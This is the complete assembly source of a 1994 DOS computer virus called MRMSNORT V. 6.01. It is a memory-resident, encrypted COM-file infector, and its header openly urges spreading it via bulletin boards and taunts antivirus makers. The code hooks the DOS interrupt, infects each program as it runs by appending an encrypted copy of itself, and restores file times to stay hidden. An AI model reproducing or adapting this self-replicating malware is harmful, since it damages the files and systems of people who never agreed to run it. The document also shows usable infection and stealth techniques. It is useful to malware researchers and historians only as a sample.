

;  ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
;  ÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅ
;  ÅÅÅÅÅÅÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ÅÅÅÅÅÅÅ
;  ÅÅÅÅÅÅ³ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÛ ÛÛÛÛÛÛÜ ÜÛÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÛÛ   ÛÛ ³ÅÅÅÅÅÅÅ
;  ÅÅÅÅÅÅ³ÛÛ  ÜÜÜ ÛÛÜÜÜÜ  ÛÛ   ÛÛ ÛÛ ÛÛ ÛÛ ÛÛÜÜÜÛÛ ÛÛ   ÛÛ ÛÛÜ ÜÛÛ ³ÅÅÅÅÅÅÅ
;  ÅÅÅÅÅÅ³ÛÛ   ÛÛ ÛÛßßßß  ÛÛÛÛÛÛ  ÛÛ ÛÛ ÛÛ ÛÛßßßÛÛ ÛÛ   ÛÛ  ßÛÛÛß  ³ÅÅÅÅÅÅÅ
;  ÅÅÅÅÅÅ³ßÛÛÛÛÛß ßÛÛÛÛÛÛ ÛÛ  ßÛÛ ÛÛ ÛÛ ÛÛ ÛÛ   ÛÛ ÛÛ   ÛÛ   ÞÛÝ   ³ÅÅÅÅÅÅÅ
;  ÅÅÅÅÅÅÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙÅÅÅÅÅÅÅ
;  ÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅ
;  ÅÅÅÅÅÅÅÅÅÅÅÅÅÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ÅÅÅÅÅÅÅÅÅÅÅÅÅÅ
;  ÅÅÅÅÅÅÅÅÅÅÅÅÅ³ ÍÍÍÍÍÍÍ   MRMSNORT VIRUS written ÍÍÍÍÍÍÍÍ ³ÅÅÅÅÅÅÅÅÅÅÅÅÅÅ
;  ÅÅÅÅÅÅÅÅÅÅÅÅÅ³ ÍÍÍÍÍÍÍÍ      by MRMSNORT!      ÍÍÍÍÍÍÍÍÍ ³ÅÅÅÅÅÅÅÅÅÅÅÅÅÅ
;  ÅÅÅÅÅÅÅÅÅÅÅÅÅÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙÅÅÅÅÅÅÅÅÅÅÅÅÅÅ
;  ÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅÅ(›)Å1994ÅbyÅMRMSNORTÅÅÅ
;  ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³                                                                          ³
;³  VIRUS NAME...:  MRMSNORT V. 6.01                          \         /   ³
;³  TYPE.........:  COM infector                                \     /     ³
;³  AUTHOR.......:  (›)MRMSNORT, 03.01.94, Germany                \ /       ³
;³  LANGUAGE.....:  Turbo Assembler 3.1                           / \       ³
;³  DETAILS......:                                              /     \     ³
;³                  - encrypted                               /         \   ³
;³                  - command.com infection                                 ³
;³                                                                          ³
;³  BBS-WEITERGABE ERWšNSCHT. BESONDERS DIE WEITERGABE IN DEN USA !!!       ³
;³                                                                          ³
;³                                                                          ³
;³  For contact: Tron, P.O.box 09, 17149 Stavenhagen, Germany               ³
;³                                                                          ³
;³                                                                          ³
;³                                                                          ³
;³     Fuckings are going to Johnny McAfee, Freddy and to Patty.            ³
;³                                                                          ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
                
checkres1       =       'DA'
checkres2       =       'PS'
                
        .model  tiny
        .code   
        .286                
        org     0000h
                
start:
ENCRYPT:
patchstart:
        mov     bx, offset endencrypt
        mov     cx, (heap-endencrypt)/2+1
encrypt_loop:
        db      0081h,0037h             ; xor word ptr [bx], xxxx
encryptvalue    dw      0000h
        add     bx, 0002h
        loop    encrypt_loop
endencrypt:
        call    next
next:
        pop     bp
        sub     bp, offset next
                
        push    es
        push    ds
                
        mov     ax, checkres1           ; Installation check
        int     0021h
        cmp     ax, checkres2           ; Already installed?
        jz      done_install
                
        mov     ax, ds
        dec     ax
        mov     ds, ax
        sub     word ptr ds:[0003h], ((endheap-start+1023)/1024)*64
        sub     word ptr ds:[0012h], ((endheap-start+1023)/1024)*64
        mov     es, word ptr ds:[0012h]
                
        push    cs
        pop     ds
        xor     di, di
        mov     cx, (heap-start)/2+1    ; Bytes to move
        mov     si, bp                  ; lea  si,[bp+offset start]
        rep     movsw   
                
        xor     ax, ax
        mov     ds, ax
        sub     word ptr ds:[0413h], (endheap-start+1023)/1024
        push    ds
        lds     ax, ds:[21h*4]          ; Get old int handler
        mov     word ptr es:oldint21, ax
        mov     word ptr es:oldint21+2, ds
        pop     ds
        mov     word ptr ds:[21h*4], offset int21 ; Replace with new handler
        mov     ds:[21h*4+2], es        ; in high memory
                
done_install:
        pop     ds
        pop     es
restore_COM:
        mov     di, 0100h
        push    di
        lea     si, [bp+offset old3]
        movsb   
        movsb   
        movsb   
        ret     
                
old3            db      0cdh,20h,0
                
int21:
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es
                
        cmp     ax, 4B00h               ; execute?
        jz      execute
return:
        jmp     exitint21
execute:
        mov     word ptr cs:filename, dx
        mov     word ptr cs:filename+2, ds
        lds     dx, cs:filename
        mov     ax, 4300h
        int     0021h
        jc      return
        push    cx
        push    ds
        push    dx
                
        mov     ax, 4301h               ; clear file attributes
        push    ax                      ; save for later use
        xor     cx, cx
        int     0021h
                
        lds     dx, cs:filename
        mov     ax, 3D02h
        int     0021h
        xchg    ax, bx
                
        push    cs
        pop     ds
                
        push    cs
        pop     es
                
        mov     ax, 5700h               ; get file time/date
        int     0021h
        push    cx
        push    dx
                
        mov     dx, offset readbuffer
        mov     ah, 003Fh
        mov     cx, 001Ah
        int     0021h
                
        mov     ax, 4202h
        xor     cx, cx
        xor     dx, dx
        int     0021h
                
        cmp     word ptr [offset readbuffer], 'ZM'
        jz      close
        mov     cx, word ptr [offset readbuffer+1] ; jmp location
        add     cx, heap-start+3        ; convert to filesize
        cmp     ax, cx                  ; equal if already infected
        jz      close
                
        mov     di, offset old3
        mov     si, offset readbuffer
        movsb   
        movsw   
                
        mov     si, ax                  ; save entry point
        add     si, 0100h
        sub     ax, 0003h
        mov     word ptr [offset readbuffer+1], ax
        mov     dl, 00E9h
        mov     byte ptr [offset readbuffer], dl
        mov     ah, 002Ch               ; Get current time
        int     0021h
                
        add     si, (offset endencrypt-offset encrypt)
        mov     word ptr ds:[patchstart+1], si
        mov     word ptr ds:[encryptvalue], dx
                
        mov     cx, (heap-encrypt)/2
        mov     si, offset ENCRYPT
        mov     di, offset encryptbuffer
        push    si
        rep     movsw                   ; copy virus to buffer
                
        mov     ax, offset endencrypt-encrypt+encryptbuffer
        mov     word ptr ds:[patchstart+1], ax
        pop     si
        push    offset endencrypt
        mov     byte ptr [offset endencrypt], 00C3h ; retn
        push    bx
        call    si                      ; encrypt virus in buffer
        pop     bx
        pop     word ptr [offset endencrypt]
                
                
        mov     ah, 0040h
        mov     cx, heap-encrypt
        mov     dx, offset encryptbuffer
        int     0021h
                
        xor     cx, cx
        mov     ax, 4200h
        cwd     
        int     0021h
                
                
        mov     ah, 0040h
        mov     cx, 0003h
        mov     dx, offset readbuffer
        int     0021h
                
                
close:
        mov     ax, 5701h               ; restore file time/date
        pop     dx
        pop     cx
        int     0021h
                
        mov     ah, 003Eh
        int     0021h
                
        pop     ax                      ; restore file attributes
        pop     dx                      ; get filename and
        pop     ds
        pop     cx                      ; attributes from stack
        int     0021h
                
exitint21:
        pop     es
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
                
        db      00EAh                   ; return to original handler
oldint21        dd      ?
                
signature       db      'MRMSNORT',0
creator         db      'MRMSNORT',0
virusname       db      'MRMSNORT-VIRUS-EASTGERMANY',0
                
heap:
encryptbuffer   db      (heap-encrypt)+1 dup (?)
filename        dd      ?
readbuffer      db      1ah dup (?)
endheap:
        end     start

;;===========================================================================
;;==============MOST GREETINGS TO ALL VIRUS WRITERS !========================
;;===========================================================================

